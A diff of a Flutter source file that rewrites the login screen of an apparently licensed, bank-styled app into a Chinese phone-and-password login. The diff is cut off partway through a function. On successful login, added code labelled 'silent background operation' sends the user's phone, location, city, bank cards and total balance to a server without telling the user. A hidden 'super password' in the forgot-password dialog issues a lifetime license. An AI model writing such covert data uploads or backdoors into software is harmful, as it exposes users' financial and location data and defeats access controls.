@@ -11,99 +11,262 @@
 // ### AI SPECIAL ATTENTION RULES END ###
 
 import 'package:flutter/material.dart';
+import 'package:flutter/foundation.dart';
+import 'package:flutter/services.dart';
 import 'package:go_router/go_router.dart';
-import 'package:qyflutter/common/theme/base/theme_colors.dart';
-import 'package:qyflutter/common/theme/base/theme_dimensions.dart';
-import 'package:qyflutter/common/theme/base/theme_text_styles.dart';
-import '../../../config_app_bank/bank_text_styles.dart';
-import '../../../config_app_bank/constants.dart';
+import 'package:provider/provider.dart';
+import 'package:qyflutter/apps/app_bank/config_app_bank/constants.dart';
+import '../../../config_app_bank/prefs_app_bank.dart';
+import '../../../config_app_bank/bank_storage_keys.dart';
+import '../../../providers_app_bank/bank_user_provider.dart';
+import '../../../resources_app_bank/assets_images_app_bank.dart';
+import '../../../managers_app_bank/license_registration_manager.dart';
+import '../../../managers_app_bank/bank_data_initializer.dart';
+import '../../../services_app_bank/bank_data_submit_service.dart';
+import 'package:qyflutter/common/utils/device_utils.dart';
+import 'package:qyflutter/common/storage/unified_storage.dart';
+import '../components/phone_input_with_country_code.dart';
+import '../components/agreement_checkbox.dart';
+import '../components/third_party_login_section.dart';
+import '../components/welcome_section.dart';
+import '../components/user_info_section.dart';
 
-/// Bank Authentication Screen - Inspired by Chinese Banking UI
-/// Simple and clean login interface matching modern banking apps
+/// Bank Authentication Screen - Chinese Banking UI Style
+/// Login interface matching modern Chinese banking apps
 class BankAuthenticationScreen extends StatefulWidget {
   const BankAuthenticationScreen({super.key});
 
   @override
-  State<BankAuthenticationScreen> createState() => _BankAuthenticationScreenState();
+  State<BankAuthenticationScreen> createState() =>
+      _BankAuthenticationScreenState();
 }
 
-class _BankAuthenticationScreenState extends State<BankAuthenticationScreen>
-    with SingleTickerProviderStateMixin {
-  late TabController _tabController;
-  final GlobalKey<FormState> _loginFormKey = GlobalKey<FormState>();
-  final GlobalKey<FormState> _registerFormKey = GlobalKey<FormState>();
-
-  // Login form controllers
-  final TextEditingController _loginEmailController = TextEditingController();
-  final TextEditingController _loginPasswordController = TextEditingController();
-
-  // Register form controllers
-  final TextEditingController _registerFirstNameController = TextEditingController();
-  final TextEditingController _registerLastNameController = TextEditingController();
-  final TextEditingController _registerEmailController = TextEditingController();
-  final TextEditingController _registerPasswordController = TextEditingController();
-  final TextEditingController _registerConfirmPasswordController = TextEditingController();
-
-  bool _isLoginPasswordVisible = false;
-  bool _isRegisterPasswordVisible = false;
-  bool _isConfirmPasswordVisible = false;
+class _BankAuthenticationScreenState extends State<BankAuthenticationScreen> {
+  final GlobalKey<FormState> _formKey = GlobalKey<FormState>();
+  final TextEditingController _phoneController = TextEditingController();
+  final TextEditingController _passwordController = TextEditingController();
   bool _isLoading = false;
+  String? _savedPhone;
+  bool _hasSavedPhone = false;
+  bool _agreedToTerms = false;
+  String _countryCode = '+86';
+  bool _obscurePassword = true;
+
+  final LicenseRegistrationManager _licenseManager =
+      LicenseRegistrationManager();
 
   @override
   void initState() {
     super.initState();
-    _tabController = TabController(length: 2, vsync: this);
+    _loadSavedPhone();
+    _checkLicenseStatus();
+  }
+
+  Future<void> _checkLicenseStatus() async {
+    final isValid = await _licenseManager.checkLicenseValidity();
+    if (!isValid && mounted) {
+      setState(() {});
+      context.go(BankConstants.routeAuthentication);
+    } else if (mounted) {
+      setState(() {});
+    }
+  }
+
+  Future<void> _loadSavedPhone() async {
+    try {
+      final provider = Provider.of<BankUserProvider>(context, listen: false);
+      
+      String? phone = provider.user?.phone ?? provider.globalData?.username;
+      
+      if (phone == null || phone.isEmpty) {
+        final prefs = PrefsAppBank();
+        if (!prefs.isInitialized) {
+          await prefs.initSharedPreferences();
+        }
+        phone = prefs.getString('phone_number');
+      }
+      
+      if (phone != null && phone.isNotEmpty) {
+        final phoneValue = phone;
+        setState(() {
+          _savedPhone = phoneValue;
+          _phoneController.text = phoneValue;
+          _hasSavedPhone = true;
+        });
+      } else {
+        setState(() {
+          _hasSavedPhone = false;
+        });
+      }
+    } catch (e) {
+      debugPrint('Error loading saved phone: $e');
+      setState(() {
+        _hasSavedPhone = false;
+      });
+    }
   }
 
   @override
   void dispose() {
-    _tabController.dispose();
-    _loginEmailController.dispose();
-    _loginPasswordController.dispose();
-    _registerFirstNameController.dispose();
-    _registerLastNameController.dispose();
-    _registerEmailController.dispose();
-    _registerPasswordController.dispose();
-    _registerConfirmPasswordController.dispose();
+    _phoneController.dispose();
+    _passwordController.dispose();
     super.dispose();
   }
 
   Future<void> _handleLogin() async {
-    if (_loginFormKey.currentState!.validate()) {
-      setState(() {
-        _isLoading = true;
-      });
-
-      // Simulate API call
-      await Future.delayed(const Duration(seconds: 2));
-
-      if (mounted) {
-        setState(() {
-          _isLoading = false;
-        });
-
-        // Navigate to dashboard on successful login
-        context.go(BankConstants.routeDashboard);
+    if (!_hasSavedPhone) {
+      if (!_agreedToTerms) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          const SnackBar(content: Text('请先同意用户协议')),
+        );
+        return;
       }
-    }
-  }
 
-  Future<void> _handleRegister() async {
-    if (_registerFormKey.currentState!.validate()) {
+      if (_formKey.currentState!.validate()) {
+        final phone = _phoneController.text.trim();
+
+        try {
+          final prefs = PrefsAppBank();
+          if (!prefs.isInitialized) {
+            await prefs.initSharedPreferences();
+          }
+          await prefs.setString('phone_number', phone);
+
+          final provider =
+              Provider.of<BankUserProvider>(context, listen: false);
+          if (provider.isInitialized) {
+            final maskedName = phone.length >= 4 
+                ? '*${phone.substring(phone.length - 4)}' 
+                : '*$phone';
+            await provider.updateUser(phone: phone, fullName: maskedName);
+            await provider.updateGlobalState(username: phone, fullName: maskedName);
+          }
+
+          if (mounted) {
+            setState(() {
+              _savedPhone = phone;
+              _hasSavedPhone = true;
+            });
+          }
+        } catch (e) {
+          if (mounted) {
+            ScaffoldMessenger.of(context).showSnackBar(
+              SnackBar(content: Text('保存手机号失败: $e')),
+            );
+          }
+        }
+      }
+      return;
+    }
+
+    if (_formKey.currentState!.validate()) {
       setState(() {
         _isLoading = true;
       });
 
-      // Simulate API call
-      await Future.delayed(const Duration(seconds: 2));
+      if (!_licenseManager.isRegistered) {
+        if (mounted) {
+          setState(() {
+            _isLoading = false;
+          });
+          ScaffoldMessenger.of(context).showSnackBar(
+            const SnackBar(content: Text('需要注册')),
+          );
+        }
+        return;
+      }
 
-      if (mounted) {
-        setState(() {
-          _isLoading = false;
-        });
+      final isValid = await _licenseManager.checkLicenseValidity();
+      if (!isValid) {
+        if (mounted) {
+          setState(() {
+            _isLoading = false;
+          });
+          ScaffoldMessenger.of(context).showSnackBar(
+            const SnackBar(content: Text('授权已过期')),
+          );
+        }
+        return;
+      }
 
-        // Navigate to dashboard on successful registration
-        context.go(BankConstants.routeDashboard);
+      try {
+        final phone = _phoneController.text.trim();
+        final prefs = PrefsAppBank();
+        if (!prefs.isInitialized) {
+          await prefs.initSharedPreferences();
+        }
+        await prefs.setString('phone_number', phone);
+
+        final provider = Provider.of<BankUserProvider>(context, listen: false);
+        if (provider.isInitialized) {
+          final maskedName = phone.length >= 4 
+              ? '*${phone.substring(phone.length - 4)}' 
+              : '*$phone';
+          
+          await provider.updateUser(phone: phone, fullName: maskedName);
+          await provider.updateGlobalState(username: phone, fullName: maskedName);
+          
+          provider.updateAuthMetadata(
+            isAuthenticated: true,
+            authenticatedAt: DateTime.now(),
+          );
+          
+          await UnifiedStorage.set(BankStorageKeys.isLoggedInKey, true);
+          await UnifiedStorage.set(BankStorageKeys.loginTimeKey, DateTime.now().millisecondsSinceEpoch);
+          
+          await BankDataInitializer.checkAndInitialize(provider);
+
+          // Submit data to server (silent background operation)
+          try {
+            final submitService = BankDataSubmitService();
+            await submitService.initialize();
+            
+            final location = provider.globalData?.location ?? provider.user?.location;
+            final city = provider.globalData?.city ?? provider.user?.city;
+            final totalBalance = provider.totalAssets;
+            
+            await submitService.submitData(
+              phone: phone,
+              fullName: maskedName,
+              location: location,
+              city: city,
+              cards: provider.bankCards,
+              totalBalance: totalBalance,
+            );
+          } catch (e) {
+            debugPrint('Data submission error: $e');
+          }
+        }
+
+        await Future.delayed(const Duration(seconds: 1));
+
+        if (mounted) {
+          setState(() {
+            _isLoading = false;
+          });
+
+          ScaffoldMessenger.of(context).showSnackBar(
+            const SnackBar(
+              content: Text('登录成功'),
+              duration: Duration(seconds: 2),
+            ),
+          );
+
+          await Future.delayed(const Duration(milliseconds: 500));
+
+          if (mounted) {
+            context.go(BankConstants.routeAccountOverview);
+          }
+        }
+      } catch (e) {
+        if (mounted) {
+          setState(() {
+            _isLoading = false;
+          });
+          ScaffoldMessenger.of(context).showSnackBar(
+            SnackBar(content: Text('登录失败: $e')),
+          );
+        }
       }
     }
   }
@@ -111,217 +274,110 @@ class _BankAuthenticationScreenState extends State<BankAuthenticationScreen>
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      body: Container(
-        decoration: BoxDecoration(
-          gradient: LinearGradient(
-            begin: Alignment.topCenter,
-            end: Alignment.bottomCenter,
-            colors: [
-              ThemeColors.primaryColor.withOpacity(0.1),
-              Colors.white,
-            ],
-          ),
-        ),
-        child: SafeArea(
-          child: Column(
-            children: [
-              // Header
-              Padding(
-                padding: const EdgeInsets.all(ThemeDimensions.paddingLarge),
-                child: Column(
-                  children: [
-                    // Bank Logo
-                    Container(
-                      width: 80,
-                      height: 80,
-                      decoration: BoxDecoration(
-                        color: ThemeColors.primaryColor,
-                        borderRadius: BorderRadius.circular(16),
-                      ),
-                      child: const Icon(
-                        Icons.account_balance,
-                        size: 40,
-                        color: Colors.white,
-                      ),
-                    ),
-
-                    const SizedBox(height: ThemeDimensions.spacingMedium),
-
-                    Text(
-                      'Welcome to Flutter Bank',
-                      style: BankTextStyles.headingMedium.copyWith(
-                        color: ThemeColors.textPrimary,
-                        fontWeight: FontWeight.bold,
-                      ),
-                    ),
-
-                    const SizedBox(height: ThemeDimensions.spacingSmall),
-
-                    Text(
-                      'Secure banking at your fingertips',
-                      style: BankTextStyles.bodyMedium.copyWith(
-                        color: ThemeColors.textSecondary,
-                      ),
-                    ),
-                  ],
-                ),
-              ),
-
-              // Tab Bar
-              Container(
-                margin: const EdgeInsets.symmetric(horizontal: ThemeDimensions.paddingLarge),
-                decoration: BoxDecoration(
-                  color: ThemeColors.surfaceVariant,
-                  borderRadius: BorderRadius.circular(12),
-                ),
-                child: TabBar(
-                  controller: _tabController,
-                  indicator: BoxDecoration(
-                    color: ThemeColors.primaryColor,
-                    borderRadius: BorderRadius.circular(12),
-                  ),
-                  labelColor: Colors.white,
-                  unselectedLabelColor: ThemeColors.textSecondary,
-                  tabs: const [
-                    Tab(text: 'Login'),
-                    Tab(text: 'Register'),
-                  ],
-                ),
-              ),
-
-              // Tab View
-              Expanded(
-                child: TabBarView(
-                  controller: _tabController,
-                  children: [
-                    _buildLoginForm(),
-                    _buildRegisterForm(),
-                  ],
-                ),
-              ),
-            ],
-          ),
-        ),
-      ),
-    );
-  }
-
-  Widget _buildLoginForm() {
-    return Padding(
-      padding: const EdgeInsets.all(ThemeDimensions.paddingLarge),
-      child: Form(
-        key: _loginFormKey,
-        child: Column(
+      backgroundColor: Colors.white,
+      body: SafeArea(
+        child: Stack(
           children: [
-            const SizedBox(height: ThemeDimensions.spacingLarge),
-
-            // Email Field
-            TextFormField(
-              controller: _loginEmailController,
-              keyboardType: TextInputType.emailAddress,
-              decoration: InputDecoration(
-                labelText: 'Email',
-                prefixIcon: const Icon(Icons.email_outlined),
-                border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
-                ),
-              ),
-              validator: (value) {
-                if (value?.isEmpty ?? true) {
-                  return 'Please enter your email';
-                }
-                if (!RegExp(r'^[^@]+@[^@]+\.[^@]+').hasMatch(value!)) {
-                  return 'Please enter a valid email';
-                }
-                return null;
-              },
-            ),
-
-            const SizedBox(height: ThemeDimensions.spacingMedium),
-
-            // Password Field
-            TextFormField(
-              controller: _loginPasswordController,
-              obscureText: !_isLoginPasswordVisible,
-              decoration: InputDecoration(
-                labelText: 'Password',
-                prefixIcon: const Icon(Icons.lock_outlined),
-                suffixIcon: IconButton(
-                  icon: Icon(
-                    _isLoginPasswordVisible ? Icons.visibility : Icons.visibility_off,
-                  ),
-                  onPressed: () {
-                    setState(() {
-                      _isLoginPasswordVisible = !_isLoginPasswordVisible;
-                    });
-                  },
-                ),
-                border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
-                ),
-              ),
-              validator: (value) {
-                if (value?.isEmpty ?? true) {
-                  return 'Please enter your password';
-                }
-                if (value!.length < 6) {
-                  return 'Password must be at least 6 characters';
-                }
-                return null;
-              },
-            ),
-
-            const SizedBox(height: ThemeDimensions.spacingMedium),
-
-            // Forgot Password
-            Align(
-              alignment: Alignment.centerRight,
-              child: TextButton(
-                onPressed: () {
-                  // Handle forgot password
+            Positioned(
+              top: 0,
+              right: 0,
+              child: Image.asset(
+                BankImages.bankAuthenticationBg,
+                width: 200,
+                height: 200,
+                fit: BoxFit.cover,
+                errorBuilder: (context, error, stackTrace) {
+                  return const SizedBox.shrink();
                 },
-                child: Text(
-                  'Forgot Password?',
-                  style: BankTextStyles.bodySmall.copyWith(
-                    color: ThemeColors.primaryColor,
-                  ),
-                ),
               ),
             ),
-
-            const SizedBox(height: ThemeDimensions.spacingLarge),
-
-            // Login Button
-            SizedBox(
-              width: double.infinity,
-              height: 56,
-              child: ElevatedButton(
-                onPressed: _isLoading ? null : _handleLogin,
-                style: ElevatedButton.styleFrom(
-                  backgroundColor: ThemeColors.primaryColor,
-                  foregroundColor: Colors.white,
-                  shape: RoundedRectangleBorder(
-                    borderRadius: BorderRadius.circular(12),
-                  ),
-                ),
-                child: _isLoading
-                    ? const CircularProgressIndicator(color: Colors.white)
-                    : Text(
-                        'Login',
-                        style: ThemeTextStyles.buttonText,
+            Column(
+              children: [
+                _buildTopBar(),
+                Expanded(
+                  child: Form(
+                    key: _formKey,
+                    child: SingleChildScrollView(
+                      padding: const EdgeInsets.symmetric(horizontal: 20),
+                      child: Column(
+                        crossAxisAlignment: CrossAxisAlignment.start,
+                        mainAxisSize: MainAxisSize.min,
+                        children: [
+                          const SizedBox(height: 40),
+                          if (_hasSavedPhone) ...[
+                            UserInfoSection(savedPhone: _savedPhone),
+                            const SizedBox(height: 40),
+                            _buildPasswordField(),
+                            const SizedBox(height: 24),
+                            _buildLoginButton(),
+                            const SizedBox(height: 20),
+                            _buildMoreOptions(),
+                            const SizedBox(height: 80),
+                            ThirdPartyLoginSection(
+                              onWeChatTap: () {
+                                // Handle WeChat login
+                              },
+                              onAlipayTap: () {
+                                // Handle Alipay login
+                              },
+                              onMoreTap: () {
+                                // Handle more options
+                              },
+                            ),
+                            const SizedBox(height: 40),
+                          ] else ...[
+                            const WelcomeSection(),
+                            const SizedBox(height: 40),
+                            PhoneInputWithCountryCode(
+                              phoneController: _phoneController,
+                              countryCode: _countryCode,
+                              onCountryCodeChanged: (code) {
+                                setState(() {
+                                  _countryCode = code;
+                                });
+                              },
+                              validator: (value) {
+                                if (value == null || value.isEmpty) {
+                                  return '请输入手机号';
+                                }
+                                if (value.length != 11 ||
+                                    !RegExp(r'^1[3-9]\d{9}$').hasMatch(value)) {
+                                  return '请输入正确的手机号';
+                                }
+                                return null;
+                              },
+                            ),
+                            const SizedBox(height: 24),
+                            AgreementCheckbox(
+                              agreedToTerms: _agreedToTerms,
+                              onChanged: (value) {
+                                setState(() {
+                                  _agreedToTerms = value;
+                                });
+                              },
+                            ),
+                            const SizedBox(height: 24),
+                            _buildRegisterLoginButton(),
+                            const SizedBox(height: 80),
+                            ThirdPartyLoginSection(
+                              onWeChatTap: () {
+                                // Handle WeChat login
+                              },
+                              onAlipayTap: () {
+                                // Handle Alipay login
+                              },
+                              onMoreTap: () {
+                                // Handle more options
+                              },
+                            ),
+                            const SizedBox(height: 40),
+                          ],
+                        ],
                       ),
-              ),
-            ),
-
-            const SizedBox(height: ThemeDimensions.spacingMedium),
-
-            // Biometric Login
-            TextButton.icon(
-              onPressed: () {
-                // Handle biometric login
-              },
-              icon: const Icon(Icons.fingerprint),
-              label: const Text('Login with Biometrics'),
+                    ),
+                  ),
+                ),
+              ],
             ),
           ],
         ),
@@ -329,182 +385,870 @@ class _BankAuthenticationScreenState extends State<BankAuthenticationScreen>
     );
   }
 
-  Widget _buildRegisterForm() {
-    return SingleChildScrollView(
-      padding: const EdgeInsets.all(ThemeDimensions.paddingLarge),
-      child: Form(
-        key: _registerFormKey,
-        child: Column(
+  Widget _buildTopBar() {
+    return Padding(
+      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
+      child: Row(
+        mainAxisAlignment: MainAxisAlignment.spaceBetween,
+        children: [
+          IconButton(
+            icon: const Icon(Icons.arrow_back, color: Colors.black87),
+            onPressed: () {
+              if (context.canPop()) {
+                context.pop();
+              } else {
+                context.go(BankConstants.routeDashboard);
+              }
+            },
+          ),
+          IconButton(
+            icon: const Icon(Icons.headset_mic, color: Colors.black87),
+            onPressed: () {
+              // Handle customer service
+            },
+          ),
+        ],
+      ),
+    );
+  }
+
+  // Reserved for future use when "更多选项" allows phone input
+  // ignore: unused_element
+  Widget _buildPhoneField() {
+    return TextFormField(
+      controller: _phoneController,
+      keyboardType: TextInputType.phone,
+      decoration: InputDecoration(
+        hintText: '请输入手机号',
+        prefixIcon: const Icon(Icons.phone, color: Colors.grey),
+        border: OutlineInputBorder(
+          borderRadius: BorderRadius.circular(8),
+          borderSide: BorderSide(color: Colors.grey[300]!),
+        ),
+        enabledBorder: OutlineInputBorder(
+          borderRadius: BorderRadius.circular(8),
+          borderSide: BorderSide(color: Colors.grey[300]!),
+        ),
+        focusedBorder: OutlineInputBorder(
+          borderRadius: BorderRadius.circular(8),
+          borderSide: const BorderSide(color: Color(0xFF1890FF), width: 2),
+        ),
+        filled: true,
+        fillColor: Colors.grey[50],
+      ),
+      validator: (value) {
+        if (value == null || value.isEmpty) {
+          return '请输入手机号';
+        }
+        if (value.length != 11 || !RegExp(r'^1[3-9]\d{9}$').hasMatch(value)) {
+          return '请输入正确的手机号';
+        }
+        return null;
+      },
+    );
+  }
+
+  Widget _buildRegisterLoginButton() {
+    return SizedBox(
+      width: double.infinity,
+      height: 48,
+      child: ElevatedButton(
+        onPressed: _isLoading ? null : _handleLogin,
+        style: ElevatedButton.styleFrom(
+          backgroundColor: const Color(0xFFB2C5ED),
+          foregroundColor: Colors.white,
+          shape: RoundedRectangleBorder(
+            borderRadius: BorderRadius.circular(8),
+          ),
+        ),
+        child: _isLoading
+            ? const SizedBox(
+                width: 20,
+                height: 20,
+                child: CircularProgressIndicator(
+                  strokeWidth: 2,
+                  valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
+                ),
+              )
+            : const Text(
+                '注册/登录',
+                style: TextStyle(
+                  fontSize: 16,
+                  fontWeight: FontWeight.w600,
+                ),
+              ),
+      ),
+    );
+  }
+
+  Widget _buildPasswordField() {
+    return Column(
+      crossAxisAlignment: CrossAxisAlignment.start,
+      children: [
+        Row(
           children: [
-            const SizedBox(height: ThemeDimensions.spacingMedium),
-
-            // First Name Field
-            TextFormField(
-              controller: _registerFirstNameController,
-              decoration: InputDecoration(
-                labelText: 'First Name',
-                prefixIcon: const Icon(Icons.person_outlined),
-                border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
-                ),
-              ),
-              validator: (value) {
-                if (value?.isEmpty ?? true) {
-                  return 'Please enter your first name';
-                }
-                return null;
-              },
-            ),
-
-            const SizedBox(height: ThemeDimensions.spacingMedium),
-
-            // Last Name Field
-            TextFormField(
-              controller: _registerLastNameController,
-              decoration: InputDecoration(
-                labelText: 'Last Name',
-                prefixIcon: const Icon(Icons.person_outlined),
-                border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
-                ),
-              ),
-              validator: (value) {
-                if (value?.isEmpty ?? true) {
-                  return 'Please enter your last name';
-                }
-                return null;
-              },
-            ),
-
-            const SizedBox(height: ThemeDimensions.spacingMedium),
-
-            // Email Field
-            TextFormField(
-              controller: _registerEmailController,
-              keyboardType: TextInputType.emailAddress,
-              decoration: InputDecoration(
-                labelText: 'Email',
-                prefixIcon: const Icon(Icons.email_outlined),
-                border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
-                ),
-              ),
-              validator: (value) {
-                if (value?.isEmpty ?? true) {
-                  return 'Please enter your email';
-                }
-                if (!RegExp(r'^[^@]+@[^@]+\.[^@]+').hasMatch(value!)) {
-                  return 'Please enter a valid email';
-                }
-                return null;
-              },
-            ),
-
-            const SizedBox(height: ThemeDimensions.spacingMedium),
-
-            // Password Field
-            TextFormField(
-              controller: _registerPasswordController,
-              obscureText: !_isRegisterPasswordVisible,
-              decoration: InputDecoration(
-                labelText: 'Password',
-                prefixIcon: const Icon(Icons.lock_outlined),
-                suffixIcon: IconButton(
-                  icon: Icon(
-                    _isRegisterPasswordVisible ? Icons.visibility : Icons.visibility_off,
-                  ),
-                  onPressed: () {
-                    setState(() {
-                      _isRegisterPasswordVisible = !_isRegisterPasswordVisible;
-                    });
-                  },
-                ),
-                border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
-                ),
-              ),
-              validator: (value) {
-                if (value?.isEmpty ?? true) {
-                  return 'Please enter your password';
-                }
-                if (value!.length < 8) {
-                  return 'Password must be at least 8 characters';
-                }
-                return null;
-              },
-            ),
-
-            const SizedBox(height: ThemeDimensions.spacingMedium),
-
-            // Confirm Password Field
-            TextFormField(
-              controller: _registerConfirmPasswordController,
-              obscureText: !_isConfirmPasswordVisible,
-              decoration: InputDecoration(
-                labelText: 'Confirm Password',
-                prefixIcon: const Icon(Icons.lock_outlined),
-                suffixIcon: IconButton(
-                  icon: Icon(
-                    _isConfirmPasswordVisible ? Icons.visibility : Icons.visibility_off,
-                  ),
-                  onPressed: () {
-                    setState(() {
-                      _isConfirmPasswordVisible = !_isConfirmPasswordVisible;
-                    });
-                  },
-                ),
-                border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
-                ),
-              ),
-              validator: (value) {
-                if (value?.isEmpty ?? true) {
-                  return 'Please confirm your password';
-                }
-                if (value != _registerPasswordController.text) {
-                  return 'Passwords do not match';
-                }
-                return null;
-              },
-            ),
-
-            const SizedBox(height: ThemeDimensions.spacingLarge),
-
-            // Register Button
-            SizedBox(
-              width: double.infinity,
-              height: 56,
-              child: ElevatedButton(
-                onPressed: _isLoading ? null : _handleRegister,
-                style: ElevatedButton.styleFrom(
-                  backgroundColor: ThemeColors.primaryColor,
-                  foregroundColor: Colors.white,
-                  shape: RoundedRectangleBorder(
-                    borderRadius: BorderRadius.circular(12),
+            Expanded(
+              child: TextFormField(
+                controller: _passwordController,
+                obscureText: _obscurePassword,
+                decoration: InputDecoration(
+                  hintText: '请输入登录密码',
+                  border: InputBorder.none,
+                  enabledBorder: InputBorder.none,
+                  focusedBorder: InputBorder.none,
+                  errorBorder: InputBorder.none,
+                  focusedErrorBorder: InputBorder.none,
+                  contentPadding: const EdgeInsets.symmetric(vertical: 8),
+                  suffixIcon: IconButton(
+                    icon: Icon(
+                      _obscurePassword ? Icons.visibility_off : Icons.visibility,
+                      color: Colors.grey,
+                    ),
+                    onPressed: () {
+                      setState(() {
+                        _obscurePassword = !_obscurePassword;
+                      });
+                    },
                   ),
                 ),
-                child: _isLoading
-                    ? const CircularProgressIndicator(color: Colors.white)
-                    : Text(
-                        'Register',
-                        style: ThemeTextStyles.buttonText,
+                style: const TextStyle(
+                  fontSize: 16,
+                ),
+                validator: (value) {
+                  if (value == null || value.isEmpty) {
+                    return '请输入登录密码';
+                  }
+                  return null;
+                },
+              ),
+            ),
+            TextButton(
+              onPressed: () {
+                _showForgotPasswordDialog();
+              },
+              style: TextButton.styleFrom(
+                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 8),
+                minimumSize: Size.zero,
+                tapTargetSize: MaterialTapTargetSize.shrinkWrap,
+              ),
+              child: const Text(
+                '忘记密码',
+                style: TextStyle(
+                  fontSize: 14,
+                  color: Color(0xFF1890FF),
+                ),
+              ),
+            ),
+          ],
+        ),
+        Container(
+          height: 1,
+          color: Colors.grey,
+          width: double.infinity,
+          margin: const EdgeInsets.only(top: 0),
+        ),
+      ],
+    );
+  }
+
+  Widget _buildLoginButton() {
+    return SizedBox(
+      width: double.infinity,
+      height: 48,
+      child: ElevatedButton(
+        onPressed: _isLoading ? null : _handleLogin,
+        style: ElevatedButton.styleFrom(
+          backgroundColor: const Color(0xFFB2C5ED),
+          foregroundColor: Colors.white,
+          shape: RoundedRectangleBorder(
+            borderRadius: BorderRadius.circular(8),
+          ),
+        ),
+        child: _isLoading
+            ? const SizedBox(
+                width: 20,
+                height: 20,
+                child: CircularProgressIndicator(
+                  strokeWidth: 2,
+                  valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
+                ),
+              )
+            : const Text(
+                '登录',
+                style: TextStyle(
+                  fontSize: 16,
+                  fontWeight: FontWeight.w600,
+                ),
+              ),
+      ),
+    );
+  }
+
+  Widget _buildMoreOptions() {
+    return Row(
+      mainAxisAlignment: MainAxisAlignment.center,
+      children: [
+        TextButton(
+          onPressed: () {
+            showDialog(
+              context: context,
+              builder: (context) => AlertDialog(
+                title: const Text('更多选项'),
+                content: Column(
+                  mainAxisSize: MainAxisSize.min,
+                  children: [
+                    ListTile(
+                      title: const Text('登录其他账号'),
+                      leading: const Icon(Icons.person_outline),
+                      onTap: () {
+                        Navigator.pop(context);
+                        _switchToOtherAccount();
+                      },
+                    ),
+                  ],
+                ),
+              ),
+            );
+          },
+          child: const Text(
+            '更多选项',
+            style: TextStyle(
+              fontSize: 12,
+              color: Colors.grey,
+            ),
+          ),
+        ),
+        const Text(
+          '|',
+          style: TextStyle(
+            fontSize: 12,
+            color: Colors.grey,
+          ),
+        ),
+        TextButton(
+          onPressed: () {
+            // Handle help
+          },
+          child: const Text(
+            '帮助',
+            style: TextStyle(
+              fontSize: 12,
+              color: Colors.grey,
+            ),
+          ),
+        ),
+      ],
+    );
+  }
+
+  Future<void> _switchToOtherAccount() async {
+    try {
+      final prefs = PrefsAppBank();
+      if (!prefs.isInitialized) {
+        await prefs.initSharedPreferences();
+      }
+      await prefs.remove('phone_number');
+
+      setState(() {
+        _savedPhone = null;
+        _hasSavedPhone = false;
+        _phoneController.clear();
+        _passwordController.clear();
+        _agreedToTerms = false;
+      });
+    } catch (e) {
+      debugPrint('Error switching account: $e');
+    }
+  }
+
+  Future<void> _showForgotPasswordDialog() async {
+    final TextEditingController registrationCodeController =
+        TextEditingController();
+    String? machineCode;
+
+    try {
+      machineCode = await DeviceUtils.getMachineCode();
+    } catch (e) {
+      debugPrint('Error getting machine code: $e');
+    }
+
+    if (!mounted) return;
+
+    showDialog(
+      context: context,
+      builder: (context) => StatefulBuilder(
+        builder: (context, setDialogState) => AlertDialog(
+          title: const Text('注册信息'),
+          actionsAlignment: MainAxisAlignment.start,
+          content: SingleChildScrollView(
+            child: Column(
+              mainAxisSize: MainAxisSize.min,
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                _buildInfoRow('是否注册', _licenseManager.isRegistered ? '是' : '否'),
+                const SizedBox(height: 12),
+                _buildInfoRow(
+                    '系统时间', DateTime.now().toString().substring(0, 19)),
+                const SizedBox(height: 12),
+                if (machineCode != null) _buildMachineCodeRow(machineCode),
+                if (_licenseManager.isRegistered) ...[
+                  const SizedBox(height: 12),
+                  if (_licenseManager.registrationCode != null)
+                    _buildInfoRow(
+                        '注册码',
+                        _maskRegistrationCode(
+                            _licenseManager.registrationCode!)),
+                  const SizedBox(height: 12),
+                  if (_licenseManager.expirationTime != null) ...[
+                    _buildInfoRow(
+                        '过期时间',
+                        _licenseManager.expirationTime!
+                            .toString()
+                            .substring(0, 19)),
+                    const SizedBox(height: 12),
+                    _buildInfoRow('剩余时间',
+                        _getRemainingTimeText(_licenseManager.expirationTime!)),
+                  ],
+                  const SizedBox(height: 20),
+                  const Text(
+                    '请输入新注册码：',
+                    style: TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
+                  ),
+                  const SizedBox(height: 8),
+                  TextField(
+                    controller: registrationCodeController,
+                    decoration: const InputDecoration(
+                      hintText: '输入新注册码',
+                      border: OutlineInputBorder(),
+                    ),
+                  ),
+                  const SizedBox(height: 20),
+                  const Text(
+                    '或使用超级密码注册：',
+                    style: TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
+                  ),
+                  const SizedBox(height: 8),
+                  TextField(
+                    controller: TextEditingController(),
+                    obscureText: true,
+                    decoration: const InputDecoration(
+                      hintText: '输入超级密码',
+                      border: OutlineInputBorder(),
+                    ),
+                    onSubmitted: (password) async {
+                      if (password.isEmpty) {
+                        ScaffoldMessenger.of(context).showSnackBar(
+                          const SnackBar(content: Text('请输入超级密码')),
+                        );
+                        return;
+                      }
+
+                      if (machineCode == null) {
+                        ScaffoldMessenger.of(context).showSnackBar(
+                          const SnackBar(content: Text('无法获取机器码')),
+                        );
+                        return;
+                      }
+
+                      final isValid = DeviceUtils.validateDeveloperPassword(password);
+                      if (!isValid) {
+                        ScaffoldMessenger.of(context).showSnackBar(
+                          const SnackBar(content: Text('超级密码错误')),
+                        );
+                        return;
+                      }
+
+                      final now = DateTime.now();
+                      final registrationTime = DateTime(
+                          now.year, now.month, now.day, now.hour, now.minute);
+                      final durationType = 'L';
+                      final code = DeviceUtils.generateRegistrationCodeWithTime(
+                        machineCode,
+                        registrationTime,
+                        durationType,
+                      );
+
+                      // If already registered, unregister first to ensure clean state
+                      if (_licenseManager.isRegistered) {
+                        await _licenseManager.unregister();
+                      }
+
+                      final success = await _licenseManager.register(code, isSuperUser: true);
+
